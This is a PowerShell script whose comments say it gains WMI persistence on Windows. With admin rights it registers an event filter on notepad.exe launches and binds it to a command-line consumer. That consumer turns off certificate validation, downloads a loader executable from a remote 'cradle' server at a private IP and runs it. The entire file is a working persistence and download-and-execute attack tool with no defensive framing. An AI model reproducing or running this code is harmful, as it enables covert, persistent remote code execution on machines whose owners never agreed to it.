# This script was made to gain WMI persistence. It does this by creating an event consumer to download a stager from my cradle and links it to the opening of Notepad.
#
# Required pre-reqs include:
#  - Local admin privilege

# Check for local admin privilege
$privilgecontext = new-object security.principal.windowsprincipal([security.principal.windowsidentity]::getcurrent())
$admin = $privilgecontext.IsInRole([security.principal.windowsbuiltinrole]::Administrator)

if (-not($admin))
{
    Write-Host "This needs to have admin privilege to run successfully."
    Remove-Variable -Name privilgecontext, admin
    exit
}

# Variable to hold the same table variables
if (-not(test-path -path "Variable:\cimtable"))
{
    $cimtable = @{
    ErrorAction = 'Stop'
    NameSpace= 'root\subscription'
}}

# Look for the creation of notepad every two seconds.
$cimtable.class = '__EventFilter'
$cimtable.arguments = @{
name = 'testfilter'
eventnamespace = 'root\cimv2'
querylanguage = 'WQL'
query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
}

if (-not(test-path -path "Variable:\filterresult"))
{
    $filterresult = new-ciminstance @cimtable
}

# Reach out to the cradle to get the loader and execute it
$cimtable.class = 'commandlineeventconsumer'
$cimtable.arguments = @{
name = 'testconsumer'
commandlinetemplate = @'
powershell.exe -NoProfile -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://192.168.174.128:8100/uploads/custom_load.exe','C:\Users\doe99\OneDrive\Desktop\custom.exe'); start-process -FilePath "C:\Users\doe99\OneDrive\Desktop\custom.exe"
'@}

if (-not(test-path -path "Variable:\consumerresult"))
{
    $consumerresult = new-ciminstance @cimtable
}

# Attach the filter to the consumer so that when notepad is opened, the cradle gets reached out to.
$cimtable.class ='__filtertoconsumerbinding'
$cimtable.arguments = @{
filter = [ref]$filterresult
consumer = [ref]$consumerresult
}

if (-not(test-path -path "Variable:\bindingresult"))
{
    $bindingresult = new-ciminstance @cimtable
}
